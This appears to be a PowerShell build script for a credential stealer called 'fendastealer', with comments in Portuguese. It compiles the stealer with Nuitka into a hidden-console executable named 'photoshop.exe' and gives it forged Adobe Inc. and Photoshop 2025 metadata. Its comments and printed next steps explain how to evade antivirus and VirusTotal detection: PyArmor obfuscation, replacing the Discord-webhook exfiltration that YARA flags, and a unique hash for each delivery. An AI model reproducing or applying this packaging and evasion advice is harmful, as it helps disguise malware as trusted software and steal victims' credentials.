# build_nuitka.ps1 - build do fendastealer com Nuitka (sem "DNA do PyInstaller")
#
# Requisitos:  pip install nuitka ordered-set zstandard
#   e um compilador C: MSVC (Build Tools do Visual Studio), MinGW64 ou Zig
#   (o Nuitka baixa o Zig automaticamente com --assume-yes-for-downloads).
#
# Rodar (da raiz do repo):
#   powershell -ExecutionPolicy Bypass -File scripts\build_nuitka.ps1
#
# Observacao sobre assinatura:
#   - Self-signed so da anti-adulteracao (nao ganha reputacao/SmartScreen).
#   - Certificado valido de CA (OV) ajuda SmartScreen, mas NAO muda nada no VT.
#   - O caminho real de reducao de deteccao e: Nuitka + PyArmor + exfil nao
#     padrao (webhook do Discord = assinatura conhecida) + hash unico por build.

param(
    [string]$OutName = "photoshop",
    [string]$Icon = "assets\logo.ico"
)

$Root = Split-Path -Parent $PSScriptRoot
$Entry = Join-Path $Root 'src\fendastealer.py'
$IconPath = Join-Path $Root $Icon
$py = Join-Path $Root '.venv\Scripts\python.exe'
if (-not (Test-Path $py)) { $py = "python" }

if (-not (Test-Path $Entry)) {
    Write-Error "Entry not found: $Entry"
    exit 1
}

Push-Location $Root
try {
    $iconArgs = @()
    if (Test-Path $IconPath) { $iconArgs = @("--windows-icon-from-ico=$IconPath") }

    & $py -m nuitka `
        --standalone `
        --onefile `
        --windows-console-mode=disable `
        --enable-plugin=no-qt `
        --windows-company-name="Adobe Inc." `
        --windows-product-name="Adobe Photoshop 2025" `
        --windows-file-version=26.0.0.41 `
        --windows-product-version=26.0.0.41 `
        --remove-output `
        --assume-yes-for-downloads `
        @iconArgs `
        --output-filename="$OutName.exe" `
        $Entry
    $code = $LASTEXITCODE
}
finally {
    Pop-Location
}

if ($code -eq 0) {
    Write-Output "Build OK: $(Join-Path $Root "$OutName.exe")"
    Write-Output "Proximos passos p/ reduzir deteccao:"
    Write-Output "  1. pyarmor gen --pack onefile src\fendastealer.py (ofusca antes do Nuitka)"
    Write-Output "  2. Troque o exfil padrao (webhook Discord e o alvo n.1 de YARA)"
    Write-Output "  3. Recompile com constantes diferentes a cada entrega (hash unico)"
}
exit $code
